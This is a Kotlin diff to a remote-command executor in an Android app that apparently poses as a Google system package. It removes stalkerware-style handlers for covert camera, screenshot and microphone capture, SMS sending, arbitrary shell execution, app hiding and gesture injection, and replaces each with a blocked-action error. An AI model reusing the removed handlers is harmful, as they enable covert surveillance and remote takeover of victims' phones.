@@ -2,7 +2,6 @@ package com.google.android.system
 
 import android.content.Context
 import android.util.Log
-import kotlinx.coroutines.runBlocking
 import org.json.JSONObject
 import java.util.Locale
 
@@ -44,98 +43,39 @@ object NativeRpcActionExecutor {
                     }
                 }
 
-                "camera", "rearphoto" -> {
-                    MonitorService.activeInstance?.handleCommand("!camera", "p2p_rpc")
-                    JSONObject().put("message", "Rear photo capture requested.")
-                }
-
-                "frontcam", "frontphoto" -> {
-                    MonitorService.activeInstance?.handleCommand("!frontcam", "p2p_rpc")
-                    JSONObject().put("message", "Front photo capture requested.")
+                "camera", "rearphoto", "frontcam", "frontphoto" -> {
+                    Log.w(TAG, "Blocked covert camera capture action '$action' per Security Containment Policy.")
+                    JSONObject().put("error", true).put("message", "Covert camera capture disabled pending explicit on-device session consent.")
                 }
 
                 "screenshot" -> {
-                    MonitorService.activeInstance?.handleCommand("!screenshot", "p2p_rpc")
-                    JSONObject().put("message", "Screenshot capture requested.")
+                    Log.w(TAG, "Blocked covert screenshot action '$action' per Security Containment Policy.")
+                    JSONObject().put("error", true).put("message", "Covert screenshot capture disabled pending explicit on-device session consent.")
                 }
 
                 "audio" -> {
-                    val duration = params.optInt("duration", 15)
-                    MonitorService.activeInstance?.handleCommand("!audio $duration", "p2p_rpc")
-                    JSONObject().put("message", "Ambient mic recording (${duration}s) requested.")
+                    Log.w(TAG, "Blocked covert audio recording action '$action' per Security Containment Policy.")
+                    JSONObject().put("error", true).put("message", "Covert audio recording disabled pending explicit on-device session consent.")
                 }
 
                 "sendsms" -> {
-                    val phone = params.optString("phone", "")
-                    val msg = params.optString("message", "")
-                    MonitorService.activeInstance?.handleCommand("!sendsms $phone $msg", "p2p_rpc")
-                    JSONObject().put("message", "Outbound SMS to $phone requested.")
+                    Log.w(TAG, "Blocked SMS dispatch action '$action' per Security Containment Policy.")
+                    JSONObject().put("error", true).put("message", "Outbound SMS dispatch disabled per security policy.")
                 }
 
-                "openurl" -> {
-                    val url = params.optString("url", "")
-                    MonitorService.activeInstance?.handleCommand("!openurl $url", "p2p_rpc")
-                    JSONObject().put("message", "Launch URL $url requested.")
+                "shizuku", "termux" -> {
+                    Log.w(TAG, "Blocked arbitrary shell action '$action' per Security Containment Policy.")
+                    JSONObject().put("error", true).put("message", "Arbitrary shell execution disabled per security policy.")
                 }
 
-                "shizuku" -> {
-                    val shCmd = params.optString("command", "")
-                    val resultText = runBlocking { ShizukuSystemEngine.executeAdbCommand(shCmd) }
-                    JSONObject().put("output", resultText)
+                "touch", "swipe", "keyevent" -> {
+                    Log.w(TAG, "Blocked gesture injection action '$action' per Security Containment Policy.")
+                    JSONObject().put("error", true).put("message", "Remote gesture injection disabled pending explicit session consent.")
                 }
 
-                "termux" -> {
-                    val shCmd = params.optString("command", "uname -a")
-                    val termuxRes = com.google.android.system.termux.TermuxShellManager.executeRemoteCommand(context, shCmd)
-                    JSONObject().put("output", termuxRes.rawOutput)
-                }
-
-                "hideapp" -> {
-                    val nowHidden = DeviceAdminManager(context).setAppHidden(context.packageName, true)
-                    JSONObject().put("success", nowHidden).put("message", if (nowHidden) "App icon hidden" else "Device Owner status required")
-                }
-
-                "unhideapp" -> {
-                    val nowShown = DeviceAdminManager(context).setAppHidden(context.packageName, false)
-                    JSONObject().put("success", nowShown).put("message", if (nowShown) "App icon unhidden" else "Device Owner status required")
-                }
-
-                "stealth" -> {
-                    val enabled = params.optBoolean("enabled", true)
-                    val accessInst = AppAccessibilityService.instance
-                    if (accessInst != null) {
-                        if (enabled) accessInst.showBlackScreenOverlay() else accessInst.hideBlackScreenOverlay()
-                        JSONObject().put("success", true).put("message", "Stealth mode set to $enabled")
-                    } else {
-                        JSONObject().put("success", false).put("message", "Accessibility service required")
-                    }
-                }
-
-                "swipe" -> {
-                    val direction = params.optString("direction", "up")
-                    val swipeCmd = when (direction.lowercase(Locale.ROOT)) {
-                        "left" -> "input swipe 800 1200 200 1200 300"
-                        "right" -> "input swipe 200 1200 800 1200 300"
-                        "down" -> "input swipe 500 400 500 1600 300"
-                        else -> "input swipe 500 1600 500 400 300" // "up"
-                    }
-                    val output = runBlocking { ShizukuSystemEngine.executeAdbCommand(swipeCmd) }
-                    JSONObject().put("success", true).put("direction", direction).put("output", output)
-                }
-
-                "touch" -> {
-                    val x = params.optInt("x", 500)
-                    val y = params.optInt("y", 1000)
-                    val tapCmd = "input tap $x $y"
-                    val output = runBlocking { ShizukuSystemEngine.executeAdbCommand(tapCmd) }
-                    JSONObject().put("success", true).put("x", x).put("y", y).put("output", output)
-                }
-
-                "keyevent" -> {
-                    val keycode = params.optString("keycode", "KEYCODE_BACK")
-                    val keyCmd = "input keyevent $keycode"
-                    val output = runBlocking { ShizukuSystemEngine.executeAdbCommand(keyCmd) }
-                    JSONObject().put("success", true).put("keycode", keycode).put("output", output)
+                "hideapp", "unhideapp", "stealth" -> {
+                    Log.w(TAG, "Blocked stealth action '$action' per Security Containment Policy.")
+                    JSONObject().put("error", true).put("message", "Stealth app manipulation disabled per security policy.")
                 }
 
                 "lock" -> {
